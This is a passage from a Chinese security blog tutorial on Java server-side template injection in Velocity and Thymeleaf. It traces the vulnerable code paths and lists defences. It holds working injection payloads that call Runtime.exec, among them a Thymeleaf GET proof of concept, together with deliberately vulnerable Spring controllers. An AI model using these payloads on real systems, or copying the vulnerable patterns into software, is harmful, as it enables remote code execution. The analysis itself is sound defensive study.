class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;#set($e=/&quot;</span>e/<span class="hljs-string">&quot;)/n&quot;</span> +<br>                <span class="hljs-string">&quot;$e.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>Calc/<span class="hljs-string">&quot;)&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><br>        Velocity.init();<br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// 输出velocity渲染结果</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#set($e=&quot;e&quot;)：定义了一个Velocity变量$e，并赋值为字符串&quot;e&quot;。</span><br><span class="hljs-variable">$e</span>.getClass()：获取变量<span class="hljs-variable">$e</span>的运行时类。<br>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)：通过反射加载java.lang.Runtime类。<br>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, null)：使用反射获取Runtime类的getRuntime方法，该方法返回Runtime类的实例。<br>.invoke(null, null)：使用反射调用getRuntime方法，参数为null，因为该方法不接受任何参数。这将返回Runtime类的实例。<br>.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;open -a calculator&quot;</span>)：使用Runtime类的实例的<span class="hljs-built_in">exec</span>方法执行操作系统命令。在这里，命令是open -a calculator，即打开Mac的计算器<br>windows一般使用Calc即可<br></code></pre></td></tr></table></figure><p>运行主程序，看到计算器成功弹出</p><p><img src="/img/ssti(java)/ssti22.png"></p><p>根据测试程序，首先会进入Velocity类的init方法，在此处下断点</p><p>在该方法中，会调用RuntimeSingleton类的init方法，这个方法主要是对模板引擎的初始化，比如设置属性、初始化日志系统、资源管理器、指令等。</p><p><img src="/img/ssti(java)/ssti23.png"></p><p>接下来回到主程序中，实例化VelocityContext，并将三对键值对put进去，之后调用Velocity类的evaluate方法，此时templateString的值为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hello, <span class="hljs-comment">#set($e=&quot;e&quot;)</span><br><span class="hljs-variable">$e</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;Calc&quot;</span>) | Full name: <span class="hljs-variable">$name</span>, phone: <span class="hljs-variable">$phone</span>, email: <span class="hljs-variable">$email</span><br></code></pre></td></tr></table></figure><p>下一步进入了RuntimeInstance的evaluate方法-&gt;进入重载的evaluate方法</p><p>这个方法会调用RuntimeInstance类的parse方法进行解析。</p><p>经过两重调用来到org&#x2F;apache&#x2F;velocity&#x2F;runtime&#x2F;parser&#x2F;Parser.class的parse方法。</p><p>完成模板文件的parse工作后，生成ast语法树结构</p><p><img src="/img/ssti(java)/ssti24.png"></p><p>当执行来到engine.evaluate；我们跟进去，直接就看到了RuntimeInstance.evaluate；最后会调用 render 方法将解析后的内容渲染到 writer 中，并返回渲染结果</p><p><img src="/img/ssti(java)/ssti25.png"></p><p>跟进到render；这里主要实现的是将解析后的节点树渲染到指定的写入器中。</p><p>首先在729行调用 nodeTree.init对节点树进行初始化。接着调用 nodeTree.render将节点树渲染到写入器中。</p><p><img src="/img/ssti(java)/ssti26.png"></p><p>跟进去到render。这里主要实现的是获取节点树的子节点数量，并使用 for 循环遍历所有子节点。通过 jjtGetChild(i) 方法获取第 i 个子节点，并调用其 render 方法来渲染子节点内容到指定的写入器中。</p><p><img src="/img/ssti(java)/ssti27.png"></p><p>继续跟进jjtGetChild(i).render；最后来到了ASTReference.render.</p><p>先判断this.referenceType 的值是否为 4；然后判断this.escaped 的值为false</p><p><img src="/img/ssti(java)/ssti28.png"></p><p>继续跟进来之后，就到了ASTMethod.execute。这里接受一个 Object 对象和一个 InternalContextAdapter 对象作为参数。我们直接看到</p><p>调用 method.invoke(o, params) 方法执行方法调用，并将结果存储在 obj 变量中。</p><p><img src="/img/ssti(java)/ssti30.png"></p><p>跟进去查看invoke；判断方法是否为可变参数方法，如果是就进行一系列操作。最后调用doInvoke方法执行实际的方法调用，并返回结果。</p><p>而doInvoke方法，正是下面的doInvoke方法，可以看到getClass方法已经作为参数被传入</p><p><img src="/img/ssti(java)/ssti31.png"></p><p>最后调用了Java反射里面的invoke，进行执行</p><p><img src="/img/ssti(java)/ssti32.png"></p><h5 id="merge触发"><a href="#merge触发" class="headerlink" title="merge触发"></a>merge触发</h5><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p><p>创建一个servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.garck3h.controller;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.VelocityEngine;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.RuntimeConstants;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VelocityInjectionController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/merge&quot;)</span><br>   <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">merge</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 从请求参数中获取模板值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;template&quot;</span>);<br><br>        <span class="hljs-comment">// 从classpath中加载Velocity模板</span><br>        <span class="hljs-type">VelocityEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityEngine</span>();<br>        engine.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="hljs-string">&quot;classpath&quot;</span>);<br>        engine.setProperty(<span class="hljs-string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());<br>        engine.init();<br><br>        <span class="hljs-comment">// 动态创建Velocity上下文并设置参数</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        context.put(<span class="hljs-string">&quot;params&quot;</span>, request.getParameterMap());<br><br>        <span class="hljs-comment">// 进行模板合并</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> engine.getTemplate(template);<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        tpl.merge(context, sw);<br><br>        <span class="hljs-comment">// 创建ModelAndView对象，指定视图名为&quot;hello&quot;</span><br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-comment">// 将模板合并的结果作为属性添加到ModelAndView对象中</span><br>        modelAndView.addObject(<span class="hljs-string">&quot;hello&quot;</span>, sw.toString());<br>        <span class="hljs-comment">// 返回ModelAndView对象</span><br>        <span class="hljs-keyword">return</span> modelAndView;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模板能够插入语句时，传入payload，可以正常执行</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><ul><li>因为Spring框架版本的问题，高版本不能直接整合Velocity模板，一直报错</li><li>Velocity模板目前也逐渐被其它模板引擎替代</li></ul><h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><ul><li>Thymeleaf是目前最流行的模板引擎</li></ul><h3 id="Thymeleaf语法"><a href="#Thymeleaf语法" class="headerlink" title="Thymeleaf语法"></a>Thymeleaf语法</h3><p>Thymeleaf 表达式可以有以下类型：</p><ul><li><code>$&#123;...&#125;</code>：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行</li><li><code>*&#123;...&#125;</code>: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</li><li><code>#&#123;...&#125;</code>: Message (i18n) 表达式 —— 允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</li><li><code>@&#123;...&#125;</code>: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL&#x2F;路径（URL重写）。</li><li><code>~&#123;...&#125;</code>：片段表达式 —— <strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</li></ul><p>实际上，Thymeleaf 出现 SSTI 问题的主要原因也正是因为这个片段表达式，我们知道片段表达式语法如下：</p><ul><li><strong><code>~&#123;templatename::selector&#125;</code></strong>，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code></li></ul><p>如有一个 html 文件的代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;banquan&quot;</span>&gt;</span> <span class="hljs-symbol">&amp;copy;</span> 2021 ThreeDream yyds<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后在另一template中可以通过片段表达式引用该片段：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;footer :: banquan&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>th:insert</code>和<code>th:replace:</code>插入片段是比较常见的用法</p><ol><li><code>~&#123;templatename&#125;</code>，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li></ol><p>这个也比较好理解，不做详细举例</p><ol start="2"><li><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li></ol><p>在这里，<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等。</p><ol start="3"><li><strong>当<code>~&#123;&#125;</code>片段表达式中出现<code>::</code>，那么 <code>::</code>后需要有值（也就是<code>selector</code>）</strong></li></ol><h3 id="Thymeleaf-SSTI注入漏洞"><a href="#Thymeleaf-SSTI注入漏洞" class="headerlink" title="Thymeleaf SSTI注入漏洞"></a>Thymeleaf SSTI注入漏洞</h3><h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>只有3.x版本的Thymeleaf 才会受到影响，因为在2.x 中<code>renderFragment</code>的核心处理方法是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderFragment</span><span class="hljs-params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br><br>                <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> viewTemplateEngine.getConfiguration();<br>                <span class="hljs-type">ProcessingContext</span> <span class="hljs-variable">processingContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessingContext</span>(context);<br>                templateCharacterEncoding = getStandardDialectPrefix(configuration);<br>                <span class="hljs-type">StandardFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, <span class="hljs-string">&quot;fragment&quot;</span>);<br>                <span class="hljs-keyword">if</span> (fragment == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <br>        ...<br></code></pre></td></tr></table></figure><p>并没有3.x 版本中对于片段表达式（<code>~&#123;</code>）的处理，也因此不会造成 SSTI 漏洞，以下是 SpringBoot 默认引用的 thymeleaf 版本</p><blockquote><p>spring boot:1.5.1.RELEASE spring-boot-starter-thymeleaf:2.1.5<br>spring boot:2.0.0.RELEASE spring-boot-starter-thymeleaf:3.0.9<br>spring boot:2.2.0.RELEASE spring-boot-starter-thymeleaf:3.0.11</p></blockquote><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>主要参考：<a href="https://xz.aliyun.com/news/9962">Thymeleaf SSTI漏洞分析-先知社区 (aliyun.com)</a></p><p>这里直接使用<a href="https://github.com/veracode-research/spring-view-manipulation">veracode-research&#x2F;spring-view-manipulation(github.com)</a>项目来做复现</p><p>漏洞代码</p><p>此控制器原本用于更改页面语言</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p>运行程序后顺利弹出计算器</p><p><img src="/img/ssti(java)/ssti33.png"></p><h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>参考：<a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></p><p>此漏洞同样被触发在模板视图渲染时</p><p>通过前两个对模板的视图解析与渲染代码分析，我们可以看到开始渲染调用的是render方法，Velocity调用<code>VelocityView#render</code>渲染，FreeMarker调用&#96;&#96;FreeMarker#render<code>渲染，同样Thymeleaf调用</code>ThymleafView#render&#96;渲染。</p><p><code>render</code>方法中又通过调用<code>renderFragment</code>完成实际的渲染工作。</p><p>在这里详细分析Thymeleaf的渲染工作</p><p>createView() 首先根据视图名创建对应的View</p><p>之后开始渲染，如果此处是 FreeMarker，就会去 <code>FreeMarkerView.render()</code>，如果是 Velocity，就会去 <code>VelocityView.render()</code>，我们此处是 Thymeleaf，会去到 <code>ThymeleafView.render()</code>，跟进。</p><p>跟进 <code>renderFragment()</code> 方法。在第 100 行，判断 <code>getTemplateName</code> 当中是否存在 <code>::</code> 这一字符，如果不存在就当作是一个普通的模板，直接赋值给 <code>templateName</code>，并清空 <code>markupSelectors</code>。</p><p>所以payload末尾需要加::，并且在前面介绍~{}语法时提到：：后是需要有值(也就是<code>selector</code>)，所以末尾是.x</p><p><img src="/img/ssti(java)/ssti47.png"></p><p>继续往下走，第 108 行，调用了 <code>(FragmentExpression)parser.parseExpression()</code>，对我们输入的这一串字符进行了处理。</p><p><img src="/img/ssti(java)/ssti48.png"></p><p><img src="/img/ssti(java)/ssti49.png"></p><p>继续跟进 <code>StandardExpressionPreprocessor.preprocess()</code></p><p>复制出了比较关键的一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> String <span class="hljs-title function_">preprocess</span><span class="hljs-params">(IExpressionContext context, String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input.indexOf(<span class="hljs-number">95</span>) == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> input;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">IStandardExpressionParser</span> <span class="hljs-variable">expressionParser</span> <span class="hljs-operator">=</span> StandardExpressions.getExpressionParser(context.getConfiguration());<br>            <span class="hljs-keyword">if</span> (!(expressionParser <span class="hljs-keyword">instanceof</span> StandardExpressionParser)) &#123;<br>                <span class="hljs-keyword">return</span> input;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> PREPROCESS_EVAL_PATTERN.matcher(input);<br>                <span class="hljs-keyword">if</span> (!matcher.find()) &#123;<br>                    <span class="hljs-keyword">return</span> checkPreprocessingMarkUnescaping(input);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">strBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(input.length() + <span class="hljs-number">24</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">curr</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>先判断，input 里面是否有存在 <code>_</code> 字符，如果不存在则直接返回，不做解析处理。</p><p>接着，调用 <code>PREPROCESS_EVAL_PATTERN.matcher(input);</code>，进行正则提取，这里提取的是 <code>_</code> 中间的内容。</p><p>提取后获取到的内容是 <code>$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;Calc&quot;).getInputStream()).next()&#125;</code></p><p>此语句是被当作SpEL表达式执行的</p><p>因此 POC 中我们要构造形如<code>__xx__</code>的SpEL表达式（SpEL相关的知识点可以参考此文：<a href="https://paper.seebug.org/1694/">SPEL 表达式注入漏洞深入分析</a>），即表达式要为：<code>__$&#123;xxxxx&#125;__</code> 这种形式</p><p>因此，最终 POC 的形式就为：<code>__$&#123;xxxx&#125;__::.x</code></p><p>继续往下走，到了 <code>expression.execute()</code>，也就是命令执行的地方，语句就变成了</p><p><img src="/img/ssti(java)/ssti50.png"></p><p>至此分析过程结束。</p><h3 id="Thymeleaf-SSTI-Bypass"><a href="#Thymeleaf-SSTI-Bypass" class="headerlink" title="Thymeleaf SSTI Bypass"></a>Thymeleaf SSTI Bypass</h3><p>详情请见：<a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li>配置<code>@ResponseBody</code>或者<code>@RestController</code>，经以上注解后不会进行View解析而是直接返回。</li><li>在方法参数中加上 <code>HttpServletResponse</code>参数 ，此时spring会认为已经处理了response响应而不再进行视图解析。</li><li>在返回值前面加上 “<code>redirect:</code>“——经<code>RedirectView</code>处理。</li></ol><h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>在controller漏洞代码处下断点，可以看到若有完整的MVC框架，经过的调用栈都是相同的</p><p><img src="/img/ssti(java)/ssti34.png"></p><p><img src="/img/ssti(java)/ssti35.png"></p><p>所以以Thymeleaf为例尝试分析一下SpringMVC 视图解析过程</p><p>此处其实是涉及到的后端知识较多</p><p>参考：<a href="https://segmentfault.com/a/1190000021848063#item-2-4">spring-mvc - 深入源码分析SpringMVC执行过程 - 后端技术社区 - SegmentFault 思否</a></p><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>首先，让我们从 Spring MVC 的四大组件:<strong>前端控制器（DispatcherServlet）、处理器映射器（HandlerMapping）、处理器适配器（HandlerAdapter）以及视图解析器（ViewResolver）</strong> 的角度来看一下 Spring MVC 对用户请求的处理过程，过程如下图所示:</p><p><img src="https://img-blog.csdnimg.cn/20200221001135320.png"></p><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><ol><li>用户请求发送到<strong>前端控制器 DispatcherServlet</strong>。</li><li>前端控制器 DispatcherServlet 接收到请求后，DispatcherServlet 会使用 HandlerMapping 来处理，<strong>HandlerMapping 会查找到具体进行处理请求的 Handler 对象</strong>。</li><li>HandlerMapping 找到对应的 Handler 之后，并不是返回一个 Handler 原始对象，而是一个 Handler 执行链（HandlerExecutionChain），在这个执行链中包括了拦截器和处理请求的 Handler。HandlerMapping 返回一个执行链给 DispatcherServlet。</li><li>DispatcherServlet 接收到执行链之后，会<strong>调用 Handler 适配器去执行 Handler</strong>。</li><li>Handler 适配器执行完成 Handler（也就是 Controller）之后会得到一个 ModelAndView，并返回给 DispatcherServlet。</li><li>DispatcherServlet 接收到 HandlerAdapter 返回的 ModelAndView 之后，会根据其中的视图名调用 ViewResolver。</li><li><strong>ViewResolver 根据逻辑视图名解析成一个真正的 View 视图</strong>，并返回给 DispatcherServlet。</li><li>DispatcherServlet 接收到视图之后，会根据上面的 ModelAndView 中的 model 来进行视图中数据的填充，也就是所谓的<strong>视图渲染</strong>。</li><li>渲染完成之后，DispatcherServlet 就可以将结果返回给用户了。</li></ol><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>首先当我们访问页面的时候，将会把请求发送到<strong>前端控制器 DispatcherServlet</strong>，DispatcherServlet 是一个 Servlet，我们知道在 Servlet 在处理一个请求的时候会交给 service 方法进行处理，这里也不例外，DispatcherServlet 继承了 FrameworkServlet，首先进入 FrameworkServlet 的 <strong>service</strong> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-comment">// 请求方法</span><br>    <span class="hljs-type">HttpMethod</span> <span class="hljs-variable">httpMethod</span> <span class="hljs-operator">=</span> HttpMethod.resolve(request.getMethod());<br>    <span class="hljs-comment">// 若方法为 PATCH 方法或为空则单独处理</span><br>    <span class="hljs-keyword">if</span> (httpMethod == HttpMethod.PATCH || httpMethod == <span class="hljs-literal">null</span>) &#123;<br>        processRequest(request, response);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 其他的请求类型的方法经由父类，也就是 HttpServlet 处理</span><br>        <span class="hljs-built_in">super</span>.service(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>HttpServlet 中会根据请求类型的不同分别调用 doGet 或者 doPost 等方法，FrameworkServlet 中已经重写了这些方法，在这些方法中会调用 processRequest 进行处理，在 processRequest 中会调用 <strong>doService</strong> 方法，这个 doService 方法就是在 DispatcherServlet 中实现的。下面就看下 DispatcherServlet 中的 doService 方法的实现。</p><h4 id="DispatcherServlet-收到请求"><a href="#DispatcherServlet-收到请求" class="headerlink" title="DispatcherServlet 收到请求"></a>DispatcherServlet 收到请求</h4><p>在doService处下一个断点开始调试</p><p>看到417行调用了doDispatch 方法</p><p>首先会获取当前请求的 <strong>Handler 执行链</strong>，然后找到合适的 <strong>HandlerAdapter</strong>（此处为 RequestMappingHandlerAdapter），接着调用 RequestMappingHandlerAdapter 的 <strong>handle</strong> 方法，如下为 